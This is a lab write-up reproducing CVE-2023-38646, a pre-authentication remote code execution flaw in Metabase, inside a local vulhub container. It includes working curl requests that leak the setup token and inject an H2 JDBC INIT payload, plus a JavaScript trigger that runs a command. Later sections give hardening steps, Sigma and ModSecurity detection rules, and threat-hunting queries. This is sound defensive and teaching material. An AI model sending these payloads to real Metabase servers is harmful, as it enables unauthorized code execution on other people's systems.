# CVE-2023-38646 — Metabase Pre-Auth JDBC RCE

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2023-38646 |
| Product | Metabase Open Source < 0.46.6.1 / Enterprise < 1.46.6.1 |
| Attack Vector | Network (Pre-Auth) |
| Impact | Remote Code Execution |
| CVSS 3.1 | 9.8 Critical |
| Patch | 0.46.6.1 / 1.46.6.1 |

Metabase exposes a `/api/setup/validate` endpoint that accepts database connection parameters along with a `setup-token`. The token is leaked via `/api/session/properties` even after initial setup. An attacker can supply a crafted H2 JDBC URL with an `INIT` parameter to execute arbitrary SQL — including functions like `CSVWRITE` that interact with the filesystem — achieving unauthenticated RCE.

## 2. Attack Chain

```
Recon: GET /api/session/properties → extract setup-token
  └─▶ Craft: Build H2 JDBC URL with INIT=CALL CSVWRITE(...) or CREATE TRIGGER
      └─▶ Deliver: POST /api/setup/validate with crafted details
          └─▶ Impact: Arbitrary file write / command execution as metabase user
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/metabase/CVE-2023-38646
docker compose up -d
# Metabase 0.46.6 on JDK 11 (Temurin-11.0.19)
# Wait ~60s for initialization, then complete setup wizard (skip data source)
```

### Step 1 — Leak Setup Token

```bash
curl -s http://localhost:3000/api/session/properties | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['setup-token'])"
# 751a6652-9ad4-44fb-867a-3e550fe92b97
```

The token persists even after setup is complete — this is the root cause.

### Step 2 — JDBC URL Injection (H2 INIT Parameter)

```bash
curl -s -X POST http://localhost:3000/api/setup/validate \
  -H "Content-Type: application/json" \
  -d '{
    "token": "751a6652-9ad4-44fb-867a-3e550fe92b97",
    "details": {
      "is_on_demand": false, "is_full_sync": false, "is_sample": false,
      "cache_ttl": null, "refingerprint": false, "auto_run_queries": true,
      "schedules": {},
      "details": {
        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL CSVWRITE('"'"'/tmp/pwned'"'"'\\, '"'"'SELECT 1'"'"'\\, '"'"'UTF-8'"'"')",
        "advanced-options": false, "ssl": true
      },
      "name": "pwn", "engine": "h2"
    }
  }'
# HTTP 204 — success, no body
```

### Step 3 — Verify RCE

```bash
docker exec cve-2023-38646-web-1 ls -la /tmp/pwned
# -rw-r--r-- 1 metabase metabase 0 ... /tmp/pwned
```

### Alternative: JavaScript Trigger (vulhub original)

```http
"init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
	java.lang.Runtime.getRuntime().exec('touch /tmp/success')
$$"
```

Note: The JavaScript trigger requires Nashorn (JDK ≤ 14). The `INIT` parameter in the JDBC URL with `CSVWRITE` is more reliable across H2 versions.

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **JDBC URL injection is a full RCE primitive**: H2's `INIT` parameter executes arbitrary SQL on connection — including filesystem-interacting functions like `CSVWRITE`.
- **Setup tokens must be invalidated**: Metabase leaked the setup-token via a public API endpoint even after setup completion.
- **Defense-in-depth for embedded databases**: H2 running in-process inherits the application's full permissions — no sandboxing.
- **Multiple RCE paths exist**: `CSVWRITE` (file write), `CREATE TRIGGER` with JavaScript (code exec), `CREATE ALIAS` (requires javac) — blocking one isn't enough.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to Metabase ≥ 0.46.6.1; invalidate setup-token after first setup |
| API | Remove `/api/setup/validate` from unauthenticated routes; require admin session |
| JDBC | Disable H2 `INIT` parameter via allowlist: only permit `jdbc:h2:` URLs without `;INIT=` |
| Network | Bind Metabase to internal network only; front with reverse proxy requiring auth |
| Container | Run as non-root, read-only filesystem, drop all capabilities except NET_BIND_SERVICE |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — Metabase JDBC injection attempt
title: Metabase CVE-2023-38646 JDBC Injection
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs-uri-stem: '/api/setup/validate'
    cs-method: 'POST'
  keywords:
    cs-body|contains:
      - 'INIT='
      - 'CSVWRITE'
      - 'CREATE TRIGGER'
      - 'CREATE ALIAS'
      - 'RUNSCRIPT'
  condition: selection and keywords
  level: critical
```

```
# ModSecurity rule
SecRule REQUEST_URI "@streq /api/setup/validate" \
  "id:2023386461,phase:2,deny,status:403,\
   chain,msg:'CVE-2023-38646 Metabase JDBC injection'"
  SecRule REQUEST_BODY "@rx (?i)(INIT=|CSVWRITE|CREATE\s+TRIGGER|RUNSCRIPT)" ""
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| Attacker leaked setup-token | HTTP access logs | `GET /api/session/properties` from external IP after setup completion |
| JDBC injection attempted | Application logs / WAF | POST to `/api/setup/validate` with `INIT=`, `CSVWRITE`, `TRIGGER` in body |
| Post-exploitation file drop | File integrity (AIDE/osquery) | New files in `/tmp/` or writable dirs owned by `metabase` user |
| Reverse shell spawned | Network flow / EDR | Outbound connection from Metabase process to non-standard port |
| H2 console abuse | Metabase logs | Database engine errors mentioning `CREATE TRIGGER` or `CREATE ALIAS` |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | HTTP requests to Metabase API |
| docker / vulhub | Local vulnerable environment |
| python3 (json) | Payload construction with proper encoding |

- [Assetnote — Pre-Auth RCE in Metabase](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)
- [NVD — CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)
- [Metabase Security Advisory](https://www.metabase.com/blog/security-advisory)
- [H2 Database JDBC URL Parameters](https://h2database.com/html/features.html#execute_sql_on_connection)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
